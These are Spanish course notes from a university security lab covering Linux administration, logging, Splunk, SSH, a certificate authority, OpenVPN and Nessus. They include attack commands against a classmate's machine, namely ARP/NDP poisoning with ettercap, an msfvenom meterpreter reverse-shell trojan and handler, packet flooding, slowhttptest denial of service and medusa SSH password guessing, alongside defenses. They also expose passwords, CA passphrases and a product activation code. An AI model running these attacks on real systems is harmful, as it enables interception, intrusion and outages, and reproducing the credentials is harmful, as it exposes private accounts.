---
Name: Apuntes Prácticas
tags:
  - prácticas
asignatura: LSI
---
***[[Legislación y Seguridad Informática]]***

- número de máquina: 3.2.12-49.52
- dirección ip: 10.11.49.52
- contraseña: carlotanovo2003.cn
- contraseña root: aslanlynx7.
- teams: antonino.santos@udc.es

utilizar vpn para conectarse a la máquina si no tengo eduroam

- ENS33: primera tarjeta de red
	- 10.11.48.1 -> router -> conexión red internet
		- deja entrar puerto 22 (servicio ssh) 
		- deja salir puerto 80 (http), 43 (https)
		- servidores DNS 10.8.12.49/50

- ENS34: segunda tarjeta de red
	- 10.11.51.52

ubuntu: ssh lsi@10.11.49.52

**PROCESOS**
****
1. ssh -> proceso que escucha en el puerto 22
2. avahi-daemon -> intenta configurar ip, resuelve dns, intenta dar conectividad...

**COMANDOS**
****
1. ps -eaf: lista de procesos que están corriendo
2. systemctl stop avahi-daemon.socket -> para el proceso y lo hace desaparecer
	- si se hace reboot de la máquina, vuelve a aparecer
3. systemctl disable ... ->
4. systemctl enable ...-> mantiene el proceso siempre que pueda
5. systemctl mask ...-> si se hace reboot de la máquina, no se levanta el proceso
6. ls /sys/class/net -> muestra tarjetas de red
	- ens34
	- ens33
	- lo: localhost/lookback (si matamos al lo -> matamos la máquina)
7. sudo lsi -> mejor que root
8. apt dist-upgrade -> actualiza los paquetes instalados, pero si tienen dependencias con no instalados, los actualiza tambien
9. apt clean -> limpia caché
10. apt remove ... -> elimina paquete
11. apt remove --purge ... -> desinstala y borra todo del paquete
12. apt-cache search (cadena) -> busca en toda la información de la cadena, saca todos los paquetes en los que salga en su descripción dicha cadena
13. journalctl -b -> saca información detallada de todo lo que hace la máquina cuando arranca (importante -> systemd)
14. dmesg -> 
15. systemctl list-dependencies default.target -> genera toda la estructura del árbol
16. systemctl get-default -> indica el default target
17. systemctl set-default multi-user.target -> quita las x (entorno gráfico del so) al hacer reboot de la máquina (se baja el tiempo de arraque de la máquina)
18. systemctl list-unit-files --type=target
19. systemd-analyze -> tiempo de arranque de la máquina
20. systemd-analyze blame -> da también el tiempo de arranque de los servicios
21. systemctl --all -> lista todo con info
22. systemctl status x -> lista info del servicio
23. systemctl daemon-reload -> se ejecuta cuando metes servicios nuevos o modificas los existentes
24. journalctl -u x -> registra a nivel de log el servicio correspondiente
25. ifconfig -a -> interface de red
26. ifconfig ens34 down -> tira un interface de red
27. ... ... up -> levanta interface de red
28. ifconfig ens34 mtu 1200 -> variar mtu (tamaño máximo de transmisión)
29. ifconfig ens34 down, infoconfig ens34 hw ether ... -> cambiar dirección mac
30. netstat -neta -> monitorizar conexiones de la máquina


**PRÁCTICA 1**
****
- /etc/nsswitch.conf -> fichero que indica distintas cosas del so, dónde las busco y en qué orden
- /etc/apt/sources.list -> fichero donde especifica los repositorios de la distro, security (parches de seguridad), main (paquetes principales), contrib (paquetes de debian pero que a veces tienen dependencias a paquetes de otras personas), no-free (paquetes privativos), versión estable (recomendado, versiones verificadas y probadas)/de testing
-  apartado b -> journalctl -b, dmesg
- cuando se inicia la máquina, se le pasa a la bios avanzada, código ejecutable que se ejecuta y chequea el hardware (procesador, ram, placa base, gráficas...)
	- botado de disco duro -> operativos en disco duro, se configura en la bios, master bot rec (MBR), la bios le pasa el control al gestor de arranque (GRUB)
	- modificar GRUB -> /etc/default/grub -> update-grub
- systemd -> dos directorios:
	1. /lib/systemd/system -> todo lo que puede lanzar la máquina linux
	2. /etc/systemd/system -> ficheros que son enlaces simbólicos a /lib/systemd/system, que en un momento dado están en el árbol que se arranca
	3. x.target -> estados del sistema, que no ejecutan nada, ej. lpr.target
	4. x.service / x.socket -> dependen de targets, ejecutan cosas
	5. x.timers -> servicios que se ejecutan temporizados
	6. x.crontab -> ficheros de configuración donde se puede especificar año, mes, dia, hora... para definir con qué periocidad se ejecutan
	7. default.target -> nodo de arriba del árbol, marca cuando termina el systemd de montar cosas
- static -> enable de un servicio que depende de otro servicio
- solo tirar los procesos en estado enable
- crear servicio propio que haga algo -> darle permisos de ejecución al script, en /lib/systemd/system crear el servicio (x.service)
- configurar un segundo interface lógico ->
	- ifconfig ens34:0 10.11.51.255 netmask 255.255.255.255 -> crear tarjeta lógica en interface
- routing -> 
	- netstat -nr -> muestra routing estático
	- ip route -> modificar rutas
	- route add ... -> añadir ruta
	- route del ... -> borrar ruta
- monitorización ->
	- top -> saca información de las tareas
	- iptraf / iftop
- TCP WRAPPERS -> sistemas de control de acceso, filtran servicios TCP
	- /etc/hosts.deny -> deniega (qué no deja entrar) 
		- ALL:ALL:twist comando >> fichero-> todos los servicios tcp:todas las ips:twist (deniega todo)
	- /etc/hosts.allow -> a quién deja entrar
		- sshd:127.0.0.1, 10.11.49. (ip carlos) , 10.11.50. (ip carlos) 
		- sshd:10.20.0. , EDUROAM, VPN:spawn comando >> fichero
	- IPv6 -> entre corchetes [::1]
- log -> registra con día, mes año, hora, minuto, segundo todo lo que hace la máquina.
	- gestión de logs:
		- `syslog`
		- `syslogng`
		- `rsyslog`: la mayor parte de las distros Linux integran este.
			- `ps -eaf`: muestra el proceso `rsyslog`
			- `/etc/rsyslog.conf`: fichero de configuración de `rsyslog`
				- derecha -> subniveles
				- izquierda -> sistemas
				- `systemctl restart rsyslog.service` después de modificar el fichero de configuración.
				- `logger -p mail.en "hola"` genera un log
	- `systemd` integra `journald` (gestiona logs a nivel de `systemd`)
	- `journalctl` -> toda la información del log del journal
- IPv6 -> grupos de 4 caracteres hexadecimales (16 bits) separados por : hasta 128 bits
	- 2001.720.121.c: -> máquina de la udc en IPv6 (direccionamiento público).
	- fe80 ... -> direcciones de enlace local, conectividad entre las máquinas de la misma red -> **quitarlo**
	- túneles ip4 -> rutea tráfico ip6 sin tener ip6 -> 10.11.48.11 -> 2002:a0b:3064:
	- configurar ip6 en ens34
		- /etc/network/interfaces
		- auto 6to4
		- iface 6to4 inet6 v4tunnel
		- netmask 16 
		- local 10.11.48.x
	- tirar abajo ipv6 a nivel de kernel
		- `dmsg /grep IPv6`: se ve si está cargado IPv6
		- `/etc/systemctl.conf`: permite modificar muchas variables
			- net.ipv6.conf.all.disable.ipv6 = 1 -> disable de ipv6
		- `systemctl -p`
	- http:thc.org -> suite hacking IPv6
	- `thc-ipv6`
	- `alive6 ens33` 
	- IPv6 no tiene broadcast, pero sí direcciones multicast (ff02::1)
- borrar cosas para tener más espacio en disco
	- `apt remove --purge man-db`
	- `apt remove --purge dbhelper`


- Servicio NTP (puerto 123)
	- sincroniza los relojes del sistema operativo
	- `systemd-timesyncd`: stop, disable, mask o apt remove --purge
	- `apt install ntpdate ntpsec`
		- `date --set "2024-09-21 09:25"`
		- `date` -> fecha y hora actual
	- `/etc/ntpsec/ntp.conf`
		- tos maxclock 11
		- tos minclock 4 minsane 1
		- pool ... -> servidores de tiempo públicos (comentar)
		- server 127.127.1.1 -> dirección del reloj interno del sistema
		- fudge 127.127.1.1 stratum 10 
		- restrict default ... -> define restricciones (defecto)
		- restrict 10.11.48.carlos mask 255.255.255.255 noquery nopeer nomodify -> restrict a ip carlos 
			- restrict noquery -> no permite consultas
			- restrict nopeer -> no permite peers
			- restrict nomodify -> no permite modificar la configuración de un servidor
			- restrict noserve -> no permite sincronizar el reloj contra mi máquina
			- restrict ignore -> más radical, no permite ningún tráfico
		- restrict 127.0.0.1 -> restrict a localhost IPv4
		- restrict ::1 -> restrict a localhost IPv6
	- `systemctl restart ntpsec.service`
	- `journalctl -u ntpsec.service`
	- comprobar si funciona:
		- `ntpq -p`
		- `ntpdc`
	- configurar cliente:
		- `/etc/ntpsec/ntp.conf`
			- server ip compañero
			- restrict ip compañero
	- Problemas de seguridad:
		- origen-flujo-destino
		- cliente-protocolo ntp-servidor
		- Problema origen-destino
			- autenticación
		- Problema flujo
			- tráfico no cifrado -> se debe cifrar (ataque modificación)
		- Parches
		- Restrict
			- ignore en default
		- Firewall
			- filtrar quien puede y no puede entrar
- Sistema de log en red
	1. Servidor
		- `/etc/rsyslog.conf`
			- Modload intcp
			- InputTCPServerRu 514 (puerto por defecto)
			- AllowedSender TCP 127.0.0.1, 10.11.49.comp1 -> quien puede meter logs
			- $template Incoming-log "/var/log/%HOSTNAME%/%PROGRAMNAME%.log":fromhost-ip, ifequal, "10.11.48.comp1"?Incoming-by & stop (encima de los ficheros)
	2. Cliente
		- `/etc/rsyslog.conf`
			- no se descomentan las líneas del servidor
			- decirle a donde tiene que mandar los logs
				- * . * action (type="omfwd" target="10.11.48.comp1" port="514" protocol="TCP")
				- configurar cola

- SPLUNK
	SIEM (sistema de gestión de información), integra los logs de los servidores activos de red, la información que generan los sistemas de prevención de errores, firewalls...
	Cargamos en el SIEM:
	- `/var/log/rsyslog`
	- `/var/log/apache2/access.log`: apache2 -> servidor web
		- `apt install apache2` -> puerto 80 escuchando
			- abrir conexiones contra el servidor web para que queden registradas en `access.log`
			- editar `access.log` -> sustituir algunas IPs de mi portátil por IPs legales de internet.
	
	Mirar espacio en disco duro (no hacer apartado si tiene más del 50% usado).
	Instalar `splunk`:
	1. Descargar paquete de Teams (descargar la última).
	2. `apt install curl`
	3. `apt install x.dev`
	4. `/opt/splunk/bin/splunk enable boot-start`
	5. Usuario y contraseña (admin y contraseña de root)
	6. `/etc/init.d/splunk start` (inicia splunk)
	7. Abrir navegador (http://10.11.48.x:8000)
		- En la barra de búsqueda poner `index=_internal` (logs de splunk)
		- Si salta error, salir y modificar `/opt/splunk/etc/system/default/server.conf` y en `min_free space` cambiar los megas que tenemos libres en disco duro.
		- Cargar datos (`add data` -> `monitor` -> `files and directories` -> marcar `continously monitor`)
		- Búsquedas y reportes -> `source="/var/log/x" top clientip` -> IPs que accedieron al servidor web de las que más accedieron a las que menos.
	
	Cuando superemos la práctica 1, quitar el `splunk`.

**PRÁCTICA 2**
****
Conceptos: sniffing de tráfico
Comandos:
- `apt install ettercap-text-only`
- `ettercap options target1 target2` los targets se especifican con barras (ipv6 son 3 barras, sino 2 barras) macs/ipv4/ipv6/puerto
- `ettercap -I ens33 -Tq -P repoison_arp -w /home/lsi/trafico -M arp:remote /ipcarlos/ /10.11.48.1/` 
	- `Tq` -> con el tráfico que esnife.
	- `M` -> tipo de ataque
	- `remote` -> cuando una de las máquinas involucradas es un router, si no se pone se pilla solo el tráfico entre dos IPs, si se pone se pilla todo el tráfico de la IP con el router.
	- A veces se sustituye el `remote` por `oneway`, envenena al target 1 pero no al target 2, se esnifa sólo el tráfico de ida.
	- `-M dhcp` -> DHCP spoofing
	- `-M port` -> robo de puerto
	- `-M ndp` -> Network Discovery Protocol, parejo a arp pero en ipv6
	Cuando compa solicite mac del router, el comando está escuchando en red y cuando vea el comando arp, le responde y todo el tráfico pasa por mí.
	- [i] No salir con `ctrl+c`, salir con `q` 
	- [i] Sniffar sólo de una IP al router
- `ettercap -P list`: listado de todos los pluggins que se pueden usar con `-P`

2. *Apartado B*
	`Wireshark`: permite abrir cualquier fichero de tráfico para trabajar con ese tráfico
	- Montar `wireshark` en portátil y trabajar en local con el fichero.
	- Compa genera tráfico HTTP.
	- `wireshark file open`
	- Filter -> filtros para seleccionar paquetes
	- Estadísticas por protocolo
	- Estadísticas de conversaciones -> por sesión

3. *Apartado C*
	`nmap -sP 10.11.48.0/23` -> hostdiscovery contra todas las máquinas

4. *Apartado D*
	`alive6`
	`ping6 -I ens33 -c 3 ff02::1`

5. *Apartado E*
	Capturar tráfico de `ens33`, generar un `pcap` y abrirlo en `wireshark`. 
	Utilizar `tcpdump ens33 fichero`

6. *Apartado F*
	`-P remote_browser` -> obtiene URL de compañero
	`/etc/etter.conf`
	- `REMOTE_BROWSER=...`
	`lynx http://...`

7. *Apartado G*
	Instalar metasploit -> google -> instalación metasploit en debian 12
	Crear binario troyanizado:
		`msfvenom -p linux/x64/meterpreter_reverse_top lhost=10.11.49.52 lport=1234 -f elf -o navigate_path_013`
	Ejecutar metasploit
	1. `msfconsole`
	2. `use exploit/multi/handler`
	3. `set payload linux/x64/meterpreter_reverse_tcp`
	4. `set lhost 10.11.49.52`
	5. `set lport 1234`
	6. `exploit`

8. *Apartado H*
	Primera opción:
		`ettercap -M ndp //ipv6/ //ipv6/`
	Segunda opción:
		`parasite6`

9. *Apartado I*
	`apt install arpon`
	`/etc/arpon.conf` -> ip, mac
	`systemctl start arpon@ens33` -> interface que quiera
	Probar `arpon` (compañero haga envenenamiento ARP) y tirar abajo
	`/var/log/arpon.log` -> sistema de registro de logs de ARP

10. *Apartado J*
	Escanear entre máquina del compañero y firewall.
	Escaneo de puertos:
		`nmap -sS -p máquina-compa`
		`nmap -sS -sV -p máquina-compa` -> fingerprinting
		`nmap -sU 123` -> resuelve a nivel de UDP en NTP (123)
		`nmap -sL ip` -> resuelve nombres en DNS de las máquinas
		`nmap -O máquina-compa` -> fingerprinting de SO
		`nmap -6 -p 22, 80 -n dir_ipv6` -> escaneo a nivel de ipv6

11. *Apartado K*
	`apt install iftop`
	`iftop -i ens33`
	`apt install unstat`
	`vnstat -l -i ens33`

	**ACCOUNTING**
	Muestreo de variables de máquinas y dejarlo registrado a lo largo del tiempo
	`vnstat --days`
	`vnstat --weeks`

12. *Apartado M*
	Inyección de paquetes
	`packit -c 0 -B 0 -s 10.11.48.200 -d 10.11.48.100 -F S -s 1000 -p 22`
	Generación de tráfico entre la máquina 100 y la 200.
	`packit -c 0 -B 0 -s 10.11.48.100 -dR -F S -s 22 -p 1000`
	- `-dR`: genera IPs aleatorias.
	- Cambiar el 1000 por 80 para que el firewall deje salir.

	Flooding directo: se inyectan paquetes para inundar una IP de destino.
	Flooding reflectivo: se inyectan paquetes con IP origen la máquina que se quiere inundar e IP destino otras máquinas. No son paquetes directos a la máquina que se quiere inundar, se envían paquetes a otras máquinas para que, cuando respondan, se inunde la máquina que se quería inundar.

13. *Apartado N*
	Tirar abajo servidor web de compañero.
	Ataque de denegación de servicio:
	- `slowhttptest`: permite implementar los ataques típicos a servidores web.
	- `./slowhttptest -c 1000 -g -X -o show-files -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 http://10.11.49.52 -p 3`
		- `-c`: número de conexiones
		- `-g`: genera un flowchart con gráficas de cómo se comportan las conexiones.
		- `-X`: ataque que se va a hacer, ataque READ (lectura con GETS)
			- `-H`: ataque con HEADS
			- `-B`: ataque tipo POST
		- `-o`: genera fichero con los parámetros del ataque
		- `-r`: número de conexiones por segundo
		- `-w -y`: ventana de lectura de bytes
		- `-n 5`: intervalo en segundos de la lectura de buffers

	Lanzar el ataque, abrir navegador, refrescar página (si no funciona, el ataque está bien hecho).

14. *Apartado O*
	Montar `modsecurity` (firewall a nivel de aplicativo web) en ambas máquinas para detectar el ataque de denegación de servicio y pararlo.
	`apt install libapache2-mod-security2`
	`systemctl restart apache2.service`
	`/etc/apache2/apache2.conf`
	- `serverName lsi.es`

	 `/etc/hosts`
	 - `10.11.49.52 lsi.es`

	`apachectl -M | grep security` -> ver si está cargado
	`/etc/apache2/mods-available` -> security2.conf
	`/etc/apache2/mods-enabled`
	`/etc/apache2/sites-available`
	`/etc/apache2/sites-enabled`
	

	Módulos:
		`a2enmod` -> levanta módulos
		`a2dismod` -> tira abajo módulos

	Sites:
		`a2ensite` -> levanta sites
		`a2dissite` -> tira abajo sites

	**MODSECURITY**
	`/etc/modsecurity/*.conf`
	`/etc/share/mod-security-cvs/*.`
	`/etc/modsecurity/modsecurity.conf-recomended` -> renombrar como `modsecurity.conf` y hacer restart de apache2
	```
	SecRuleEngine On

	SecConnEngine On
	SecConnWriteStateLimit 40
	SecConnReadStateLimit 40
	```

15. *Apartado R*
	`medusa -H IPcompa -u lsi -P dir.txt -M ssh -f`
	`fail2bar` -> detecta ataques de password guessing
	
	*HIPS*
	Sistema de prevención de intrusiones a nivel de host.

16. *Apartado O*
	*OSSEC*
	`wget https://github.com` descargarlo de github
	Español -> Local -> directorio por defecto -> notificaciones email (lsi@localhost) -> servidor de email (localhost) -> servidor de integridad (sí) -> detección de root (sí) -> respuesta activa (sí) -> desechar en firewall (sí)

	`/var/ossec/etc/ossec.conf`
		`host.deny` -> 120
		`firewall.deny` -> 120
	`restart ossec.service`

17. *Apartado T*
	`cat auth.log | /var/ossec/bin/ossec-logtest -a`
	Clasifica incidentes con diferentes grados (0-16).

18. *Monitorización*
	*PROMETHEUS*
	`prometheus-node-exporter`
	`prometheus`
	`/etc/prometheus/prometheus.yml`
	https://www.server-world.info/en/note?os=Debian_12&p=prometheus&f=1

	*GRAFANA*
	https://www.server-world.info/en/note?os=Debian_12&p=grafana
	
	ADD DATA SOURCE
		PROMETHEUS
		server URL: http://10.11.49.52:9090

	HOME-DASHBOARD
		NEW-IMPORT -> 1860, 159


**PRÁCTICA 3**
****
1. *SSH*
	`ssh -v lsi@ip_compa`
	Por bloques, identificar qué va haciendo la conexión ssh:
	1. Lee ficheros de configuración y saca parámetros para la conexión.
	2. Mira la autenticación, busca muchos ficheros ($HOME.SSH ...), busca métodos para autenticar al usuario. Busca sistemas de clave pública/privada, como no los encuentra, busca usuario y password.
	3. Negociación de parámetros -> SSH2.MSG_KERINIT -> cliente y servidor se intercambian las estructuras de datos para ver qué algoritmos utilizar.
		- Algoritmos de compresión.
		- *Kex_algorithm*: intercambio de la clave de SSO del simétrico.
		- *Encryption_algorithm*: algoritmo simétrico.
		- *Server_host_key_algorithm*: utiliza sistema asimétrico. 
	1. Algoritmos criptográficos:
		1. *Simétricos (clave privada)*
			Utilizan una única clave. La mayor parte de los protocolos los utilizan porque son más rápidos que los asimétricos.
		2. *Asimétricos (clave pública)*
			Cada entidad tiene una clave pública y otra privada. Se cifra con la pública y se descifra con la privada (clave SSO). 
	5. Autenticación de usuario
		Busca en ficheros $HOME_SSH claves públicas/privadas para, si están creadas, autenticar de forma simétrica. Si no las encuentra, autentica a partir de usuario y password.

	- *Configurar `ssh_known_hosts`*
		`$HOME/.ssh/ssh_known_hosts`
		Contiene las claves públicas de los servidores a los que se ha conectado el usuario. Se configura de forma automática. Establecimiento de clave de sesión y cifrar tráfico. Autenticar host (servidor). 
		`etc/ssh/ssh_known_hosts`
		Igual pero estas son genéricas. **Configurar este**

		`ssh_keyscan 10.11.49.SERV >> /etc/ssh/ssh_known_hosts`
		Borrar contenido de `$HOME/.ssh/ssh_known_hosts`
		Si al hacer `ssh lsi@ip_compa` sale keyfingerprinting **MAL**

	- *Copia remota de un fichero*
		`scp fichero lsi@10.11.49.50/home/lsi`
		`scp -c chacha20-poly1305@openssh.com algcifrado.txt lsi@10.11.49.50:/home/lsi/p3`


	- *Autenticación de usuario con clave pública/privada* (en ambos sentidos)
		Conectar a máquina de prácticas de compañero sin pedir password.

		**HACERLO COMO LSI**
		`ssh-keygen -t rsa $HOME/.ssh/authorized-keys`
		***Frase de paso en blanco***.
		Genera dos ficheros en `$HOME/.ssh` (claves de cada usuario, no de server):
		- `id_rsa` (privada)
		- `id_rsa.pub` (pública)
		Claves públicas/privadas de ese usuario, no de host.
		La frase de paso aplica un hash, da una huella digital que se usa como clave, de forma que si se roba ese fichero, la clave esté cifrada. 
		Si metemos frase de paso, hay que configurar un ssh-agent.

		Para utilizar distintos algoritmos (se crean 6 ficheros)
		`ssh-keygen -t ecdsa`
		`ssh-keygen -t ed25519`

		Mandar los 3 ficheros de las públicas al compañero:
		`ssh-copy-id -i $HOME/.ssh/id_rsa lsi@10.11.49.50`
		`ssh-copy-id -i $HOME/.ssh/id_ecdsa lsi@10.11.49.50`
		`ssh-copy-id -i $HOME/.ssh/id_ed25519 lsi@10.11.49.50`

		`ssh lsi@10.11.49.50` -> debería dejar acceder sin contraseña

	- *Securizar servicio no seguro*
		`ssh -P -L 10080:10.11.49.50:80 lsi@10.11.49.50`
		Abre conexión ssh y redirige localhost de mi puerto 10080 al 80 de mi compañero, de forma que tengo tunel ssh seguro.

		**ANTES DE NADA, CLIENTE**
		`/etc/rsyslog.conf`
		donde este la IP de Carlos: localhost o 127.0.0.1
		donde este el puerto 514: 10080
		`systemctl restart rsyslog`

2. *Servidor Apache2*
	- *Configurar Autoridad Certificadora*
		Contiene clave privada y clave pública. Genera certificados para venderlos.
		`cd /usr/lib/ssl/misc/`
		`./CA.pl -newca`
			Meter frase de paso:
				W!4rM@2024_L3G!tIm4V (carlos)
				carlotaCertificado (mía)
		![[Pasted image 20241130220811.png]]
		![[Pasted image 20241130220849.png]]

		`./CA.pl -newreq-nodes`
			Dejar en blanco la frase de paso.
			Alternative names: lsi.es
			Genera dos ficheros:
			`newkey.pem` (clave privada)
			`newreq.pem` (clave pública)

		`etc/ssl/openssl.conf`
		```
		[usr_cert_]
		subjectAltName=DNS.1:lsi.es,DNS.2:lsi.com, IP:10.11.49.50
		```

		`./CA.ps -sign`
			Genera `newcert.pem` -> certificado digital de la pública firmado digitalmente por la CA.

		Enviar certificado con clave pública de CA:
		```
		scp /usr/lib/ssl/misc/demoCA/cacert.pem lsi@10.11.48.179:/home/lsi
		```

		Certificados:
		`/usr/local/share/ca-certificates/cacert.crt`

		El cacert que usemos tiene que ser el de nuestra propia CA, porque es la CA del servidor del compañero al que queremos acceder como cliente

		`mv /usr/lib/ssl/misc/demoCA/cacert.pem /usr/local/share/ca-certificates/cacert.crt`
		
		`update-ca-certificates`

	Configurar Apache2
	`a2enmod ssl` enable de ssl (https)
	`/etc/apache2/sites-available`
	- `default`
	- `ssl` -> editar este 
		`ssl engine ON`
		`ssl certificate file` -> path al .pem (certificado firmado)
		`ssl certificate key file` -> path a la clave privada del certificado
	`systemctl restart apache2`

3. *Montar VPN con openVPN*
	**Servidor**:
	1. `apt install openvpn`
	2. `apt install openssl`
	3. `lsmod | grep tum`
		Si no está cargado hacemos:
		`modprobe tum`
		`echo tum >> /etc/modules`

	`cd /etc/openvpn`
	`openvpn --genkey --secret clave.key`
	`nano tunel.conf`
	```
	local 10.11.49.50 //mía
	remote 10.11.49.52 //compañero

	dev tun1
	port 5555
	comp-lzo (método de compresión de paquetería)
	user nobody
	ping 15
	ifconfig 172.160.0.1 172.160.0.2 (túnel cifrado de la 1 a la 2)
	secret /etc/openvpn/clave.key
	cipber AES-256-CBC
	```
	`reboot`

	**Cliente**:
	Intercambiar IPs de local/remote e ifconfig en tunel.conf.

	**Ambas máquinas**:
	`openvpn --verb 5 --config /etc/openvpn/tunel.conf`
	`ifconfig -a` -> debería aparecer el túnel
	Hacer `ping 172.160.0.2` para comprobar que funciona
	
	Si se cambia el rsyslog para que mande los logs a la 172.160..., el tráfico irá cifrado por VPN. Lo mismo con el NTP.

8. *NESSUS*
	Descargar NESSUS (www.tenable.com)
	- Opción 1: 
		Montar en pc propio
	- Opción 2: 
		Montar en máquina de prácticas (hacer limpieza primero, 45% de ocupación).
	
	Conectarse con https://...:8834
	- user: aslanlynx
	- password: aslanlynx7.

	4TSD-LUEH-9S46-GW5T-NVED